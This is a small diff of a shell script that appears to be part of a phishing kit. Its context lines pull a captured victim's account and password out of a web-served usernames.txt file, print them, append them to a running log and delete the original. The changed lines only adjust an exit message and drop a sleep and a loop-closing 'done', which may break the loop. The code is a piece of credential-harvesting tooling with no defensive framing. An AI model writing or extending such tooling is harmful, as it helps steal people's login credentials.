@@ -240,12 +240,10 @@ password=$(grep -o 'Pass:.*' pd/www/usernames.txt | cut -d ":" -f2)
 echo -e $red Account:  $account
 echo -e $red Password:  $password
 cat pd/www/usernames.txt >> usernames.txt
-echo -e $red Press Ctrl + C
+echo -e $red Press Ctrl + C $red TO EXIT
 rm -rf pd/www/usernames.txt
 fi
-sleep 0.75
 
-done
 
 }
 
